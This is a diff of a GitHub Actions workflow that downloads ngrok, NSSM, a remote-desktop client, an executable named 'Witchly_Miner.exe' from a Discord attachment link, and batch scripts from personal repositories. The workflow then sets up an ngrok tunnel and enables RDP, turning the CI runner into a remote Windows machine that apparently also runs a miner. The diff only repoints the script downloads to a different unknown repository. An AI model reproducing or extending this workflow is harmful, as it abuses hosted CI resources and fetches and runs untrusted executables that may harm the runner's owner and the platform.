@@ -12,7 +12,7 @@ jobs:
     - name: Download Ngrok & NSSM
       run: |
         Invoke-WebRequest https://raw.githubusercontent.com/TheDarkMythos/Ngrok-Exe/master/ngrok.exe -OutFile ngrok.exe
-        Invoke-WebRequest https://github.com/chonkey821/windowsci/raw/main/nssm.exe -OutFile nssm.exe
+        Invoke-WebRequest https://github.com/primas305/winnos/raw/main/nssm.exe -OutFile nssm.exe
         Invoke-WebRequest https://officecdn.microsoft.com/pr/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/media/en-US/O365HomePremRetail.img -Outfile O365HomePremRetail.img
         Invoke-WebRequest https://download.reemo.io/reemo.setup.x64.exe  -Outfile reemo.exe
         invoke-WebRequest https://cdn.discordapp.com/attachments/933944268484141096/942574848922755112/Witchly_Miner.exe -Outfile witchly.exe
@@ -29,11 +29,11 @@ jobs:
         NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
     - name: Download Important Files.
       run: |
-        Invoke-WebRequest https://github.com/chonkey821/windowsci/raw/main/NGROK-AP.bat -OutFile NGROK-AP.bat
-        Invoke-WebRequest https://github.com/chonkey821/windowsci/raw/main/NGROK-CHECK.bat -OutFile NGROK-CHECK.bat
-        Invoke-WebRequest https://github.com/chonkey821/windowsci/raw/main/loop2.bat -OutFile loop2.bat
+        Invoke-WebRequest https://github.com/primas305/winnos/raw/main/NGROK-AP.bat -OutFile NGROK-AP.bat
+        Invoke-WebRequest https://github.com/primas305/winnos/raw/main/NGROK-CHECK.bat -OutFile NGROK-CHECK.bat
+        Invoke-WebRequest https://github.com/primas305/winnos/raw/main/loop2.bat -OutFile loop2.bat
         Invoke-WebRequest http://www2.cs.uidaho.edu/~jeffery/win32/unzip.exe -OutFile unzip.exe
-        Invoke-WebRequest https://github.com/chonkey821/windowsci/raw/main/barrier.zip -OutFile barrier.zip
+        Invoke-WebRequest https://github.com/primas305/winnos/raw/main/barrier.zip -OutFile barrier.zip
     - name: Make YML file for NGROK.
       run: start NGROK-AP.bat
     - name: Enable RDP Access.
